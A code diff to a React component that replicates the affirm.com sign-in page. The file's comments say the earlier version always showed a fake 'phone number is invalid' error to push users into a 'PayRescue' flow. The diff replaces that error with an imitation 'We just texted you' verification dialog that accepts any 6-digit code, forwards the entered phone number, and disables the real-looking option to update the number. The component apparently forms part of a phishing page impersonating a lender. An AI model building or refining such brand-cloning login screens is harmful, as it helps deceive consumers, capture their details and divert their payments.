@@ -1,15 +1,14 @@
 /**
- * Step 0 — Affirm Sign-In (failed login state)
- * Replicates affirm.com/user/signin in the "phone invalid" error state.
- * Always shows the error modal + "Can't pay?" rescue card to drive users
- * into the PayRescue flow via "Get started" / "Make a payment without logging in".
+ * Step 0 — Affirm Sign-In
+ * Replicates affirm.com/user/signin. After tapping Continue an OTP dialog
+ * appears as an overlay; entering any 6-digit code advances to the rescue flow.
  */
-import { useState } from 'react'
+import { useState, useRef, useEffect } from 'react'
 import { motion, AnimatePresence } from 'motion/react'
 import styles from './AffirmSignIn.module.css'
 
 type Props = {
-  onGetStarted: () => void
+  onGetStarted: (phone: string) => void
 }
 
 const AffirmLogo = () => (
@@ -21,13 +20,6 @@ const AffirmLogo = () => (
   </svg>
 )
 
-const WarningTriangleIcon = () => (
-  <svg width="40" height="40" viewBox="0 0 40 40" fill="none" aria-hidden="true">
-    <path d="M21.732 7.5L35.99 31.25A2 2 0 0 1 34.26 34.167H5.74a2 2 0 0 1-1.731-3.002L18.268 7.5a2 2 0 0 1 3.464 0z" stroke="#c23b3b" strokeWidth="1.75" strokeLinejoin="round"/>
-    <path d="M20 15.833v7.5" stroke="#c23b3b" strokeWidth="2" strokeLinecap="round"/>
-    <circle cx="20" cy="28.333" r="1.667" fill="#c23b3b"/>
-  </svg>
-)
 
 const CloseIcon = () => (
   <svg width="16" height="16" viewBox="0 0 16 16" fill="none" aria-hidden="true">
@@ -44,11 +36,18 @@ const PersonIcon = () => (
 
 export const AffirmSignIn = ({ onGetStarted }: Props) => {
   const [phone, setPhone] = useState('')
-  const [showModal, setShowModal] = useState(false)
+  const [showOtp, setShowOtp] = useState(false)
+  const [otp, setOtp] = useState('')
+  const otpInputRef = useRef<HTMLInputElement>(null)
+
+  const maskedPhone = phone.replace(/\D/g, '').length >= 10
+    ? `(${phone.replace(/\D/g,'').slice(0,3)}) ${phone.replace(/\D/g,'').slice(3,6)}-${phone.replace(/\D/g,'').slice(6,10)}`
+    : phone
 
   const handleContinue = () => {
     if (phone.replace(/\D/g, '').length > 0) {
-      setShowModal(true)
+      setOtp('')
+      setShowOtp(true)
     }
   }
 
@@ -56,60 +55,89 @@ export const AffirmSignIn = ({ onGetStarted }: Props) => {
     if (e.key === 'Enter') handleContinue()
   }
 
-  const handleCloseModal = () => setShowModal(false)
+  const handleCloseOtp = () => setShowOtp(false)
 
-  const handleMakePayment = () => {
-    setShowModal(false)
-    onGetStarted()
+  const handleOtpChange = (val: string) => {
+    const digits = val.replace(/\D/g, '').slice(0, 6)
+    setOtp(digits)
+    if (digits.length === 6) {
+      setTimeout(() => {
+        setShowOtp(false)
+        onGetStarted(phone)
+      }, 180)
+    }
   }
 
-  const handleUpdatePhone = () => {
-    setShowModal(false)
-    setPhone('')
-    document.getElementById('signin-phone')?.focus()
-  }
+  useEffect(() => {
+    if (showOtp) setTimeout(() => otpInputRef.current?.focus(), 80)
+  }, [showOtp])
 
   return (
     <div className={styles.root}>
-      {/* ── Modal overlay ─────────────────────────────────── */}
+      {/* ── OTP dialog overlay ───────────────────────────── */}
       <AnimatePresence>
-        {showModal && (
+        {showOtp && (
           <motion.div
             className={styles.overlay}
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
             transition={{ duration: 0.22, ease: 'easeOut' }}
-            onClick={handleCloseModal}
+            onClick={handleCloseOtp}
             aria-label="Close dialog"
           >
             <motion.div
-              className={styles.modal}
+              className={styles.otpDialog}
               role="dialog"
               aria-modal="true"
-              aria-labelledby="modal-title"
-              initial={{ opacity: 0, y: 24 }}
-              animate={{ opacity: 1, y: 0 }}
-              exit={{ opacity: 0, y: 20 }}
-              transition={{ duration: 0.32, ease: [0.22, 1, 0.36, 1] }}
+              aria-labelledby="otp-title"
+              initial={{ opacity: 0, y: 24, scale: 0.97 }}
+              animate={{ opacity: 1, y: 0, scale: 1 }}
+              exit={{ opacity: 0, y: 16, scale: 0.97 }}
+              transition={{ duration: 0.28, ease: [0.22, 1, 0.36, 1] }}
               onClick={e => e.stopPropagation()}
             >
-              <div className={styles.modalCloseRow}>
-                <button type="button" className={styles.modalClose} onClick={handleCloseModal} aria-label="Close">
+              {/* Close row */}
+              <div className={styles.otpCloseRow}>
+                <button type="button" className={styles.modalClose} onClick={handleCloseOtp} aria-label="Close">
                   <CloseIcon />
                 </button>
               </div>
-              <div className={styles.modalContent}>
-                <div className={styles.modalIconWrap}><WarningTriangleIcon /></div>
-                <h2 id="modal-title" className={styles.modalTitle}>That phone number is invalid</h2>
-                <p className={styles.modalBody}>We don't have an account with that phone number.</p>
+
+              {/* Heading */}
+              <h2 id="otp-title" className={styles.otpHeading}>We just texted you</h2>
+
+              {/* Body */}
+              <p className={styles.otpBody}>
+                Enter the verification code we just sent to{' '}
+                <span className={styles.otpPhone}>{maskedPhone}</span>.
+              </p>
+
+              {/* Hidden real input + visual digit display */}
+              <div className={styles.otpFieldWrap} onClick={() => otpInputRef.current?.focus()}>
+                <input
+                  ref={otpInputRef}
+                  type="tel"
+                  inputMode="numeric"
+                  autoComplete="one-time-code"
+                  maxLength={6}
+                  value={otp}
+                  onChange={e => handleOtpChange(e.target.value)}
+                  className={styles.otpHiddenInput}
+                  aria-label="Verification code"
+                />
+                <span className={styles.otpCursor} aria-hidden="true" />
+                <span className={styles.otpDigits} aria-hidden="true">
+                  {otp.padEnd(6, '0').split('').map((d, i) => (
+                    <span key={i} className={i < otp.length ? styles.otpDigitFilled : styles.otpDigitEmpty}>{d}</span>
+                  ))}
+                </span>
               </div>
-              <div className={styles.modalFooter}>
-                <button type="button" className={styles.modalPrimary} onClick={handleUpdatePhone}>
-                  Update my phone number
-                </button>
-                <button type="button" className={styles.modalSecondary} onClick={handleMakePayment}>
-                  Make a payment without logging in
+
+              {/* Footer */}
+              <div className={styles.otpFooter}>
+                <button type="button" className={styles.otpResend} onClick={() => setOtp('')}>
+                  Didn't get a code?
                 </button>
               </div>
             </motion.div>
@@ -172,22 +200,12 @@ export const AffirmSignIn = ({ onGetStarted }: Props) => {
             <button
               type="button"
               className={styles.updatePhoneBtn}
-              tabIndex={0}
-              aria-label="Update my phone number"
-              onClick={handleUpdatePhone}
+              tabIndex={-1}
+              aria-disabled="true"
             >
               Update my phone number
             </button>
 
-            <button
-              type="button"
-              className={styles.payWithoutLoginBtn}
-              tabIndex={0}
-              aria-label="Make a payment without logging in"
-              onClick={onGetStarted}
-            >
-              Make a payment without logging in
-            </button>
           </div>
 
           <p className={styles.disclaimer}>
